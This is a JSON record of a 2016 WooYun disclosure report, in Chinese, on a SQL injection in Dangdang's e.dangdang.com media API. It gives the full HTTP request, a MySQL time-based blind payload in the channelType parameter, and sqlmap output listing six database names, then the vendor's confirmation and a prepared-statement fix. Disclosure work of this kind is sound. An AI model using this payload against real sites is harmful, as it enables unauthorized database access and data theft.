{"id": 87577, "wybug_id": "wooyun-2016-0199964", "wybug_title": "当当网分站存在SQL注入                                      ", "wybug_corp": "当当网", "wybug_author": "Vinc", "wybug_date": "2016-04-25 09:38", "wybug_open_date": "2016-06-09 11:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-09：\t细节向公众公开  简要描述： - = ！ 详细说明：  GET包如下：\nGET /media/api.go?action=mediaRankingList&listType=sale&channelType=*&permanentId=20151109120332208112113523718686951&returnType=json&channelId=70000&clientVersionNo=5.0.0&deviceType=DDDS_ALL&start=0&end=19 HTTP/1.1Accept: */*Referer: http://e.dangdang.com/rank_detail_page.htmlX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Cookie: __permanent_id=20160423211433821241934195768855298; ddscreen=1; MDD_channelId=70000; MDD_fromPlatform=307; dest_area=country_id%3D9000%26province_id%3D173%26city_id%20%3D0%26district_id%3D0%26town_id%3D0Connection: Keep-aliveAccept-Encoding: gzip,deflateAccept-Language: zh-CN,en,*Host: e.dangdang.comPragma: no-cacheCache-Control: no-cache\n参数：channelType   漏洞证明：  sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* (URI)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: http://e.dangdang.com:80/media/api.go?action=mediaRankingList&listype=sale&channelType=' AND (SELECT * FROM (SELECT(SLEEP(5)))HUfh) AND 'aSqF'='aqF&permanentId=20151109120332208112113523718686951&returnType=json&channelId=7000&clientVersionNo=5.0.0&deviceType=DDDS_ALL&start=0&end=19---[09:45:07] [INFO] testing MySQLdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n][09:45:14] [INFO] confirming MySQL[09:45:14] [WARNING] it is very important not to stress the network adapter durng usage of time-based payloads to prevent potential errors[09:45:26] [INFO] adjusting time delay to 1 second due to good response times[09:45:26] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL >= 5.0.0[09:45:26] [INFO] fetching database names[09:45:26] [INFO] fetching number of databases[09:45:26] [INFO] retrieved: 6[09:45:30] [INFO] retrieved: inf[09:45:50] [ERROR] invalid character detected. retrying..[09:45:50] [WARNING] increasing time delay to 2 secondsormation_schem[09:47:59] [ERROR] invalid character detected. retrying..[09:47:59] [WARNING] increasing time delay to 3 secondsa[09:48:05] [INFO] retrieved: digital[09:49:55] [INFO] retrieved: digita[09:51:46] [ERROR] invalid character detected. retrying..[09:51:46] [WARNING] increasing time delay to 4 secondsl_[09:53:13] [ERROR] invalid character detected. retrying..[09:53:13] [WARNING] increasing time delay to 5 secondssearch[09:55:21] [INFO] retrieved: dpp[09:57:30] [ERROR] invalid character detected. retrying..[09:57:30] [WARNING] increasing time delay to 6 seconds_datebase[10:00:39] [INFO] retrieved: short_link[10:05:14] [INFO] retrieved: testavailable databases [6]:[*] digital[*] digital_search[*] dpp_datebase[*] information_schema[*] short_link[*] test   修复方案：  预编译吧   版权声明：转载请注明来源 Vinc@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-04-25 11:49 厂商回复： 感谢对当当安全的支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}